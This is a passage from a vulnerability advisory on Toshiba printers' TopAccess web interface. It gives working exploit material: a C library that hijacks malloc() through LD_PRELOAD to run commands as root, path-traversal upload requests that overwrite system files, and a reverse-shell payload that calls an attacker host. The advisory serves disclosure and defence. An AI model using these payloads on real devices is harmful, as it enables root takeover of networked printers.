776fb000-776fd000 rw-p 0001e000 08:02 154622     /home/SYSROM_SRC/build/thirdparty/lib/libaprutil-1.so.0.6.1
776fd000-776fe000 rw-p 00000000 00:00 0
776fe000-77702000 r-xp 00000000 08:02 154313     /home/SYSROM_SRC/build/thirdparty/lib/mod_headers.so
77702000-77703000 rw-p 00003000 08:02 154313     /home/SYSROM_SRC/build/thirdparty/lib/mod_headers.so
77703000-77712000 r-xp 00000000 00:0d 10594      /ramdisk/al/libGetAddtInfoInterface.so
77712000-77714000 rw-p 0000e000 00:0d 10594      /ramdisk/al/libGetAddtInfoInterface.so
77714000-77715000 rw-p 00000000 00:00 0
77715000-77720000 r-xp 00000000 00:0d 11406      /ramdisk/al/libGetNameInfoInterface.so
77720000-77722000 rw-p 0000a000 00:0d 11406      /ramdisk/al/libGetNameInfoInterface.so
</code></pre>
<p>Because of weak permissions, we can overwrite hundreds of libraries to get Remote Code Execution.</p>
<p>We can overwrite the 2 libraries that will be loaded by default by the programs running inside the printers:</p>
<ul>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
</ul>
<p>These 2 libraries export Intel-optimized functions.</p>
<p>Exported functions found in the LD_PRELOAD'ed libraries:</p>
<pre><code>kali% nm -D /home/user/research/printers/topaccess/4.50-latest-version/4.50-new-version/extract/home/SYSROM_SRC/build/release/lib/libGetNameInfoInterface.so.0
0000cf40 A __bss_start
00009150 T __cacheSize
         w __cxa_finalize@GLIBC_2.1.3
         U dlsym@GLIBC_2.0
0000cf40 A _edata
0000cfc0 A _end
00009d04 T _fini
00002340 T getnameinfo
00002290 T getNameInfoWrapper
         w __gmon_start__
00002088 T _init
00009cb0 T __intel_f2int
00002530 T _intel_fast_memcpy
00002440 T _intel_fast_memcpy.A
00002500 T _intel_fast_memcpy.H
00002470 T _intel_fast_memcpy.J
000024a0 T _intel_fast_memcpy.M
000024d0 T _intel_fast_memcpy.P
000026f0 T _intel_fast_memset
00002600 T _intel_fast_memset.A
00002660 T _intel_fast_memset.H
00002630 T _intel_fast_memset.J
00002690 T _intel_fast_memset.M
000026c0 T _intel_fast_memset.P
000027cc T __intel_memcpy
000033fd T __intel_memset
000027c0 T __intel_new_memcpy
00003b10 T __intel_new_memcpy_P3
000033f0 T __intel_new_memset
00004a90 T __intel_new_memset_P3
000051e0 T __intel_sse2_memset
00005850 T __intel_sse2_rep_memset
00005dd0 T __intel_ssse3_memcpy
00007dc0 T __intel_ssse3_rep_memcpy
         w _Jv_RegisterClasses
         U memcpy@GLIBC_2.0
         U memset@GLIBC_2.0
         U pthread_create@GLIBC_2.1
         U pthread_join@GLIBC_2.0
kali% nm -D /home/user/research/printers/topaccess/4.50-latest-version/4.50-new-version/extract/home/SYSROM_SRC/build/release/lib/libGetNameInfoInterface.so.0
0000cf40 A __bss_start
00009150 T __cacheSize
         w __cxa_finalize@GLIBC_2.1.3
         U dlsym@GLIBC_2.0
0000cf40 A _edata
0000cfc0 A _end
00009d04 T _fini
00002340 T getnameinfo
00002290 T getNameInfoWrapper
         w __gmon_start__
00002088 T _init
00009cb0 T __intel_f2int
00002530 T _intel_fast_memcpy
00002440 T _intel_fast_memcpy.A
00002500 T _intel_fast_memcpy.H
00002470 T _intel_fast_memcpy.J
000024a0 T _intel_fast_memcpy.M
000024d0 T _intel_fast_memcpy.P
000026f0 T _intel_fast_memset
00002600 T _intel_fast_memset.A
00002660 T _intel_fast_memset.H
00002630 T _intel_fast_memset.J
00002690 T _intel_fast_memset.M
000026c0 T _intel_fast_memset.P
000027cc T __intel_memcpy
000033fd T __intel_memset
000027c0 T __intel_new_memcpy
00003b10 T __intel_new_memcpy_P3
000033f0 T __intel_new_memset
00004a90 T __intel_new_memset_P3
000051e0 T __intel_sse2_memset
00005850 T __intel_sse2_rep_memset
00005dd0 T __intel_ssse3_memcpy
00007dc0 T __intel_ssse3_rep_memcpy
         w _Jv_RegisterClasses
         U memcpy@GLIBC_2.0
         U memset@GLIBC_2.0
         U pthread_create@GLIBC_2.1
         U pthread_join@GLIBC_2.0
kali%
</code></pre>
<p>An attacker can create a new library and export a function that will be used by any program, for example <code>malloc()</code>.</p>
<p>A custom library has been written, hijacking the control flow of the <code>malloc()</code> function:</p>
<pre><code>kali% cat Makefile 
all:
        rm /home/user/research/printers/topaccess/malloc/malloc.so
        gcc -o malloc.so -m32 -shared -fPIC malloc.c

kali% cat malloc.c 
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dlfcn.h&gt;

void *malloc(size_t size)
{
  static void *(*fptr)(size_t) = NULL;

  if (fptr == NULL)
  {
    fptr = (void *(*)(size_t))dlsym(RTLD_NEXT, "malloc");
    if (fptr == NULL)
    {
      printf("dlsym: %s\n", dlerror());
      return NULL;
    }
  }

  system("LD_PRELOAD='' id &gt; /dev/shm/id");

  return (*fptr)(size);
}
kali% make
rm /home/user/research/printers/topaccess/malloc/malloc.so
gcc -o malloc.so -m32 -shared -fPIC malloc.c
kali% ls -la
total 32
drwx------ 2 user user  4096 May 13 11:04 .
drwx------ 4 user user  4096 May 13 11:02 ..
-rw------- 1 user user   112 May 13 11:04 Makefile
-rw------- 1 user user   398 May 13 11:03 malloc.c
-rwx------ 1 user user 14696 May 13 11:04 malloc.so
kali%
</code></pre>
<p>When uploading this library as <code>/ramdisk/al/libGetAddtInfoInterface.so</code> or <code>/ramdisk/al/libGetNameInfoInterface.so</code>, the <code>malloc()</code> function will be executed by some programs running inside the printers and the id command will be executed as root (the output will be written into <code>/dev/shm/id</code>).</p>
<p>A side effect it that a lot of programs will also crash. The execution of the malicious payload will still work.</p>
<p>By targeting only specific functions used by Apache or specific programs inside the printer, it is possible to avoid crashing the programs.</p>
<p><a id="pre-auth-rce-misc"></a></p>
<h3>Other ways to get Remote Code Execution</h3>
<p>An attacker can use the other vulnerabilities to get Remote Code Execution:</p>
<ul>
<li><a href="#lpe-rce-path">Local Privilege Escalation and Remote Code Execution using insecure PATH</a></li>
<li><a href="#lpe-rce-ld-preload">Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</a></li>
<li><a href="#lpe-rce-ld-library-path">Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</a></li>
<li><a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a></li>
<li><a href="#lpe-rce-cissm">Local Privilege Escalation and Remote Code Execution using CISSM</a></li>
</ul>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>An attacker can overwrite any insecure files (including programs running as root and Python code).</p>
<p><a id="post-auth-rces-upload"></a></p>
<h2>Details - Multiple Post-authenticated Remote Code Executions as root</h2>
<p>Toshiba printers provide several ways to upload files using the admin web interface.</p>
<p>The vulnerability in this chapter is similar to <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> but requires authentication on the TopAccess interface.</p>
<p>When an administrator is authenticated, it is possible to upload documents within the web interface using the maintenance interface:</p>
<ul>
<li>Upload of drivers files;</li>
<li>Upload of MAC PPD Files;</li>
<li>Upload of Unix Filters;</li>
<li>Upload of Driver packages;</li>
<li>Upload of address book, mailboxes and templates;</li>
<li>Upload of SSL certificates;</li>
<li>...</li>
</ul>
<p>Several webpages with an upload forms can be found in the admin interface:</p>
<ul>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UnixList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UploadList.html</li>
<li>http://printer-ip/Administration/maintenance/xmlformat/XmlFormatList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/MacList.html</li>
<li>http://printer-ip/Administration/maintenance/import/ImportListFrame.html</li>
<li>http://printer-ip/Administration/Languages/InstallLanguagesUpload.html</li>
<li>http://printer-ip/Administration/AdminRegistration/ImageIconManagementFrame.html</li>
<li>http://printer-ip/Administration/Cloning/CloneFileUpload.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/DriverCustomize.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/MacList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/PointAndPrintList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UnixList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UploadList.html</li>
<li>http://printer-ip/Administration/maintenance/xmlformat/XmlFormatList.html</li>
<li>http://printer-ip/Administration/maintenance/import/ImportListFrame.html</li>
<li>http://printer-ip/Administration/maintenance/backup/BackupList.html</li>
<li>http://printer-ip/Administration/Security/Certificates/CertUpload.html</li>
<li>http://printer-ip/Administration/MetaScan/XMLFormatFile/XmlFormatList.html</li>
<li>http://printer-ip/Administration/Setup/setting/DDNSUpload.html</li>
<li>http://printer-ip/Administration/Setup/ServerConnErrRegFileUpload.html</li>
<li>http://printer-ip/Administration/Setup/PDLUpload.html</li>
<li>http://printer-ip/Administration/Setup/ICCProfile/ImportICCProfile.html</li>
<li>http://printer-ip/Administration/SystemUpdates/nSystemUpdatesUpload.html</li>
</ul>
<p>All these upload functionalities are vulnerable: they allow an attacker with admin privilege to overwrite any file present in the printers.</p>
<p>The vulnerability likely resides in the <code>/home/SYSROM_SRC/build/release/lib/mod_contentwebserver.so.0</code> library, where the <code>/contentwebserver/upload</code> API is implemented. Consequently, this is a unique vulnerability that is reachable by using different upload forms.</p>
<p>For example, we can see 3 different types of upload forms:</p>
<p>Upload of Driver files</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-01.png" /></p>
<p><a href="images/2024-toshiba-post-auth-upload-file-01-full.png">Click here for full image</a></p>
<p>Upload of Unix filters</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-02.png" /></p>
<p><a href="images/2024-toshiba-post-auth-upload-file-02-full.png">Click here for full image</a></p>
<p>Upload of address book, mailboxes and templates</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-03.png" /></p>
<p><a href="images/2024-toshiba-post-auth-upload-file-03-full.png">Click here for full image</a></p>
<p>All of these forms are vulnerable by crafting a malicious <code>name</code> value as shown in the next screenshot. It is possible to change the HTTP request by modifying the name value to rewrite any file in the printer.</p>
<p>For example, it is possible to overwrite the <code>/home/SYSROM_SRC/build/common/bin/networkservice/ldapserver</code> shell script by sending a malicious file using the name value <code>/./../../../../../home/SYSROM_SRC/build/common/bin/networkservice/ldapserver</code>:</p>
<p>Upload of malicious ldapserver shell script:</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-04.png" /></p>
<p>It is necessary to update the cookie and the CsrfpId values:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------136357212815291094282690264320
Content-Length: 1056
Origin: http://10.0.0.1:8081
Connection: close
Referer: http://10.0.0.1:8081/Administration/maintenance/uploadsoft/DriverCustomize.html?v=1670278837ta&amp;fileMode=3
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DMAINT%26CAT%3DUPSW; IgnoreSessionTimeout=1; Session=10.0.0.2.3dfcc68624ce6c49d245e33f704a92b3; clicked=0; addrLastVisited=FAVGRP
Upgrade-Insecure-Requests: 1

-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[0].formSubmitCompleteUploadList
-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;Command&gt;&lt;Move&gt;&lt;commandNode&gt;FileStorages&lt;/commandNode&gt;&lt;Params&gt;&lt;source&gt;&lt;File&gt;script.zip&lt;/File&gt;&lt;name&gt;Upload&lt;/name&gt;&lt;/source&gt;&lt;destination&gt;&lt;name&gt;PDPlugin&lt;/name&gt;&lt;/destination&gt;&lt;/Params&gt;&lt;/Move&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.3dfcc68624ce6c49d245e33f704a92b3
-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="/./../../../../../home/SYSROM_SRC/build/common/bin/networkservice/ldapserver"; filename="script.zip"
Content-Type: application/zip

#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.0.0.2/21 0&gt;&amp;1

-----------------------------136357212815291094282690264320--
</code></pre>
<p>Following this HTTP request, the file <code>/home/SYSROM_SRC/build/common/bin/networkservice/ldapserver</code> will be overwritten with a malicious payload.</p>
<p>Before the execution of the HTTP request, the file is normal:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
-rwxrwxrwx 1 root root 7007 Mar 15 11:45 /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
bash-4.1# head /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
#!/bin/bash
LDAP_STARTUP_STATUS=0;

function stop() {
        echo "slapd is stopped"
        kill -SIGINT `pgrep slapd`
        check_stop_process
}

function start() {
bash-4.1#
</code></pre>
<p>After the execution of the HTTP request, the file has been modified. It now contains the malicious payload:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
-rw-rw-rw- 1 apache trusted 52 May 27 16:35 /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
bash-4.1# cat /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.0.0.2/21 0&gt;&amp;1
bash-4.1#
</code></pre>
<p>Another exploitation of a different form is shown below, using the upload of drivers. It exploits the same vulnerability. The file <code>/home/SYSROM_SRC/sbin/malicious.program</code> will contain <code>test</code>:</p>
<p>Upload of <code>/home/SYSROM_SRC/sbin/malicious.program</code>:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------8960912535828260861374302822
Content-Length: 1813
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/Administration/maintenance/uploadsoft/UnixList.html?v=1517352288ta&amp;fileMode=2
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DMAINT%26CAT%3DUPSW; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; SessionID=Session_3e61919e-556b-4be7-8a18-91bb65a4752b; clicked=0; addrLastVisited=ADDRBK; IgnoreSessionTimeout=1; Session=10.0.0.2.cab8f72fb0d8c69e622235cfff9d3cee
Upgrade-Insecure-Requests: 1

-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[0].formSubmitCompleteUploadList
-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;Command&gt;&lt;Move&gt;&lt;commandNode&gt;FileStorages&lt;/commandNode&gt;&lt;Params&gt;&lt;source&gt;&lt;File&gt;aix.tar&lt;/File&gt;&lt;name&gt;Upload&lt;/name&gt;&lt;/source&gt;&lt;destination&gt;&lt;name&gt;Unix-Filters&lt;/name&gt;&lt;/destination&gt;&lt;/Params&gt;&lt;/Move&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.cab8f72fb0d8c69e622235cfff9d3cee
-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="/./../../../../../home/SYSROM_SRC/sbin/malicious.program"; filename="aix.tar"
Content-Type: application/x-tar

test

-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="hpux.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="hpux64.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="linux.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="openunix.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="solaris.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822--
</code></pre>
<p>And we can confirm this file has been uploaded on the printer:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/sbin/malicious.program
-rw-rw-rw- 1 apache trusted 5 May 27 07:48 /home/SYSROM_SRC/sbin/malicious.program
bash-4.1#
</code></pre>
<p>This vulnerability can be used to get Remote Code Executions using several different ways. Due to some weaknesses found in Toshiba printers, there are hundreds different ways to get Remote Code Execution. For example:</p>
<ul>
<li>Upload of a malicious library defined in the LD_PRELOAD variable:<ul>
<li>/ramdisk/al/libGetNameInfoInterface.so or /ramdisk/al/libGetAddtInfoInterface.so can be overwritten by a malicious library</li>
</ul>
</li>
<li>Upload of a malicious library using the LD_LIBRARY_PATH variable - An attacker can upload malicious libraries inside:<ul>
<li>/home/SYSROM_SRC/build/release/lib,</li>
<li>/mfp/lib,</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib,</li>
<li>/home/SYSROM_SRC/build/thirdparty/plugins/platforminputcontexts/,</li>
<li>/home/SYSROM_SRC/build/release/lib.</li>
</ul>
</li>
<li>Upload of a malicious program due to insecure permissions:<ul>
<li>As shown in <a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a>, a lot of programs running as root can be overwritten due to insecure permissions (777)</li>
</ul>
</li>
<li>Upload a malicious Python program or a malicious Python library</li>
<li>Replace Bash scripts</li>
<li>...</li>
</ul>
<p>An attacker with admin privileges can remotely compromise any Toshiba printer.</p>
<p>An attacker with admin privileges can overwrite any insecure file (including programs running as root and Python code).</p>
<p><a id="lack-privilages-separation"></a></p>
<h2>Details - Lack of privileges separation</h2>
<p>Toshiba printers do not implement privileges separation. An attacker compromising a program will be able to compromise the entire printer.</p>
<p>For example, all the programs, except Apache, are running as root.</p>
<p>Apache is not running as root but a Local Privilege Escalation can be achieved using one of these vulnerabilities:</p>
<ul>
<li><a href="#lpe-rce-snmpd">Local Privilege Escalation and Remote Code Execution using snmpd</a></li>
<li><a href="#lpe-rce-path">Local Privilege Escalation and Remote Code Execution using insecure PATH</a></li>
<li><a href="#lpe-rce-ld-preload">Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</a></li>
<li><a href="#lpe-rce-ld-library-path">Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</a></li>
<li><a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a></li>
</ul>
<p>Listing of processes on the printer:</p>
<pre><code>bash-4.1# ps auxw
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   1740   512 ?        Ss   16:34   0:00 init [3]  
root         2  0.0  0.0      0     0 ?        S    16:34   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    16:34   0:00 [ksoftirqd/0]
[...]
root      1448  0.0  0.7 143680 21860 ?        Sl   16:34   0:00 /home/SYSROM_SRC/build/release/bin/slapd -h ldap://127.0.0.1 -f /home/SYSROM_SRC/build/release/etc/openldap/slapd.conf -d 1
root      1460  0.0  0.2 387308  8036 ?        Sl   16:34   0:02 /home/SYSROM_SRC/bin/mapper firstboot=0
root      1482  0.0  0.0  26120  2628 ?        Ss   16:34   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-prox.conf -k start
apache    1486  0.0  0.1 1264444 3728 ?        Sl   16:34   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-prox.conf -k start
[...]
root      1757  0.0  0.2  34388  8176 ?        S    16:34   0:00 ./cipollproc
root      1758  0.0  0.2  34432  8180 ?        S&lt;   16:34   0:00 ./ciprioritymanager
root      1785  0.3  1.9 815004 59476 ?        Sl   16:34   0:51 ./ebx_dl 1539 1537 1540 1 2 3 -T8
root      1786  0.0  0.5 101584 15612 ?        S    16:34   0:00 ./de_ipfax 1539 1537 1540 1 2 3 -T8
root      1803  0.0  0.3  38908  9448 ?        S    16:34   0:00 ./alnfcplugin
root      1846  0.0  0.0  15544  2788 ?        S    16:34   0:00 /home/SYSROM_SRC/bin/eBXDebugLogUtility
root      1850  0.0  0.0   1744   500 ttyS0    Ss+  16:34   0:00 /sbin/getty 115200 ttyS0
root      1864  0.0  0.4  46528 13060 ?        S    16:34   0:00 ./alfilestoragem -T8
root      1866  0.0  0.6  60164 18036 ?        S    16:34   0:00 ./alusermgr
root      1867  0.0  0.4  44120 14156 ?        S    16:34   0:00 ./allicensemgmt
root      1868  0.0  0.6  56792 18680 ?        Sl   16:34   0:00 ./aldeviceserviceplugin
root      1869  0.0  1.4  84708 42192 ?        S    16:34   0:03 ./aldeviceconfigplugin
root      1870  0.0  0.6  60856 20516 ?        S    16:34   0:01 ./aluserAuthMgr
root      1871  0.0  0.3  41912 11224 ?        S    16:34   0:00 ./algrpmgr
root      1872  0.0  0.4  43616 13080 ?        S    16:34   0:00 ./alrolemgr
root      1873  0.0  0.5  54708 14972 ?        Sl   16:34   0:05 ./alrestrictionmode
root      1874  0.0  0.5  61692 15364 ?        Sl   16:34   0:00 ./alsecurityconfiguration
root      1875  0.0  0.3  41408 11008 ?        S    16:34   0:00 ./alintegritychkmgr
root      1876  0.3  3.6 482584 108060 ?       Sl   16:34   0:43 ./alUiFrameWork legacy -S ramdisk
root      1877  0.0  0.9  92276 26968 ?        Sl   16:34   0:01 ./alpanel panel 49 Controller/Settings/autoClear Controller/Information/Locale -T4
root      1878  0.0  0.4  60888 14588 ?        S    16:34   0:00 ./aljobtemplatemgr
root      1879  0.0  0.3  42492 11204 ?        S    16:34   0:00 ./alLogRetriever -T8
root      1880  0.0  0.4  49340 14248 ?        S    16:34   0:00 ./alExportImport -T8
root      1881  0.0  0.4  57852 14596 ?        S    16:34   0:00 ./aleFilingmgr -T8
root      1882  0.0  0.4  60244 13020 ?        Sl   16:34   0:00 ./alpresentationresourcemgr -T8
root      1883  0.0  0.2  35036  8340 ?        S    16:34   0:00 ./alServiceUIPlugin
root      1884  0.0  0.3  45624 10220 ?        Sl   16:34   0:00 ./alPanelUIMessageHandler -S ramdisk
root      1885  0.0  0.3  42016 11916 ?        S    16:34   0:00 ./alusbmscapplication
root      1886  0.0  0.4  70124 12236 ?        Sl   16:34   0:00 ./alViewPlugin
root      1887  0.0  0.4  83200 12652 ?        Sl   16:34   0:00 ./alsharedprintDp -T8
root      1888  0.0  0.7  62028 22420 ?        S    16:34   0:06 ./alnsm -d9 -m00 -T5
root      1890  0.0  0.5 128920 16292 ?        Sl   16:34   0:00 ./aljobcontroller -T8
root      1891  0.0  0.4 118216 12728 ?        Sl   16:34   0:00 ./alprintmn -T8
root      1892  0.0  0.3  49888 11220 ?        Sl   16:34   0:00 ./alreportsmsgr
root      1893  0.0  0.5  72764 17720 ?        Sl   16:34   0:00 ./alreportmanager
root      1922  0.0  0.3  46056 11236 ?        S    16:34   0:00 ./almailboxapplication
root      1923  0.0  0.4  44204 13528 ?        S    16:34   0:00 ./alsoftwareupdateclient -T8
root      1974  0.0  0.5  56496 15560 ?        S    16:34   0:00 ./alifaxreceive -T8
root      1975  0.0  0.4  47184 14844 ?        S    16:34   0:00 ./almaintenanceplugin -T6
root      1976  0.0  0.3  41416 11312 ?        S    16:34   0:00 ./alpdlfiltermanager
root      1977  0.0  0.4  51736 14524 ?        S    16:34   0:00 ./alCloning -T8
root      1978  0.0  0.3  43528  9412 ?        Sl   16:34   0:00 ./alPanelStartLEDHandler
root      1979  0.0  0.3  39964 11504 ?        S    16:34   0:00 ./alhomedatamgr
root      1980  0.0  0.6  47532 18748 ?        S    16:34   0:00 ./sim -T8
root      1981  0.0  0.7  92856 23600 ?        Sl   16:34   0:01 ./informationservice -T8
root      1982  0.0  0.2  34624  8476 ?        S    16:34   0:00 ./sljobmanagement -T8
root      1985  0.0  0.7  59792 22588 ?        Sl   16:34   0:00 ./notificationservice 1284 -T8
root      1986  0.0  0.9  87936 28716 ?        Sl   16:34   0:03 ./wfpc -T8
root      1987  0.0  0.3  35524  9156 ?        S    16:34   0:00 ./armn -T8
root      2205  0.0  0.4  59596 12808 ?        Ss   16:35   0:00 ./wfpc -T8
root      2208  0.0  0.3  59144 11220 ?        Ss   16:35   0:00 ./wfpc -T8
root      2327  0.0  0.4  55020 13452 ?        S    16:35   0:00 ./alAddressBookMgr
root      2328  0.0  0.5  72396 15208 ?        Sl   16:35   0:00 ./alaccountmgr
root      2426  0.0  0.3  46192 10496 ?        Sl   16:35   0:00 ./agent_scan 1282 1 -T8
root      2428  0.0  0.3  44272  9844 ?        Sl   16:35   0:00 ./agent_faxreceive 1282 2 -T8
root      2430  0.0  0.6 450116 19668 ?        Sl   16:35   0:00 ./agent_rip 1282 6 -T8
root      2432  0.0  0.3  47100 10260 ?        Sl   16:35   0:00 ./agent_print 1282 15 -T8
root      2433  0.0  0.3  44316  9816 ?        Sl   16:35   0:00 ./agent_faxtransmit 1282 16 -T8
root      2434  0.0  0.3  44296  9800 ?        Sl   16:35   0:00 ./agent_ipfaxtransmit 1282 31 -T8
root      2435  0.0  0.3  44268  9796 ?        Sl   16:35   0:00 ./agent_ipfaxreceive 1282 32 -T8
root      2515  0.0  0.4  54636 13444 ?        Sl   16:35   0:00 ./alulm
root      2516  0.0  0.3 249732  9260 ?        Sl   16:35   0:00 ./alcbamanager -S ramdisk
root      2614  0.0  0.5 183976 17564 ?        Sl   16:35   0:00 ./alappmanager
root      2870  0.0  0.4  54968 14848 ?        Sl   16:35   0:00 ./alLogmanager
root      2871  0.0  0.4  46088 13440 ?        S    16:35   0:00 ./alhddbackuprestore
[...]
root      3784  0.0  0.4  45704 12760 ?        S    16:35   0:00 /home/SYSROM_SRC/build/release/bin/alftpprintd
root      3828  0.0  0.0  15516  2424 ?        S    16:35   0:00 /home/SYSROM_SRC/build/release/bin/vsftpd -enableprinting
root      3860  0.1  2.3 201372 70908 ?        Sl   16:35   0:25 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000000
root      3935  0.0  0.4 218132 13644 ?        Sl   16:35   0:00 /home/SYSROM_SRC/build/release/bin/alhp9100 -f /encryption/al/network/config/hp9100.conf
root      3970  0.1  1.6 144908 48860 ?        Sl   16:35   0:24 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000001
root      3992  0.0  0.2  33948  8128 ?        S    16:35   0:00 /home/SYSROM_SRC/build/release/bin/snmp_watchdog
root      4025  0.0  0.2  34236  8920 ?        S    16:35   0:00 /home/SYSROM_SRC/bin/dnsValidateDaemon
[...]
</code></pre>
<p>The printer does not implement separation of privileges.</p>
<p>A vulnerability found inside one of the multiple components in the printer is enough to completely compromise the security of printer. </p>
<p><a id="lpe-rce-snmpd"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using snmpd</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure library defined inside the configuration of snmpd. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library.</p>
<p>The snmpd configuration file located at <code>/encryption/al/network/config/snmpd.conf</code> contains the loading of an external and Toshiba-specific library. The code contained inside this library will be executed as root (as snmpd is running as root).</p>
<p>Content of <code>/encryption/al/network/config/snmpd.conf</code>:</p>
<pre><code>dlmod  mibs_impl                        /home/SYSROM_SRC/lib/libalmibs_impl.so
</code></pre>
<p>This file is a symbolic link to the <code>/home/SYSROM_SRC/lib/libalmibs_impl.so.0</code> library.</p>
<p>The <code>/home/SYSROM_SRC/lib/libalmibs_impl.so.0</code> file has incorrect permissions, allowing any local attacker or any remote attacker exploiting the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability to replace this file with a malicious library.</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/lib/libalmibs_impl.so*
lrwxrwxrwx 1 root root      19 Mar 14 16:27 /home/SYSROM_SRC/lib/libalmibs_impl.so -> libalmibs_impl.so.0
<font color=red>-rwxrwxrwx</font> 1 root root 5239499 Dec  6 03:28 /home/SYSROM_SRC/lib/libalmibs_impl.so.0
bash-4.1#
</pre>

<p>This file will be loaded when snmpd starts. The snmpd program starts during the boot of the printer and is automatically restarted when it crashes.</p>
<p>It is possible to crash the remote snmpd server using the <a href="#pre-auth-rce-snmp">Pre-authenticated Remote Code Execution as root</a> vulnerability to force the restart of the snmpd daemon, load the malicious library and compromise the printer.</p>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-path"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure PATH</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure PATH variable. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious program using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
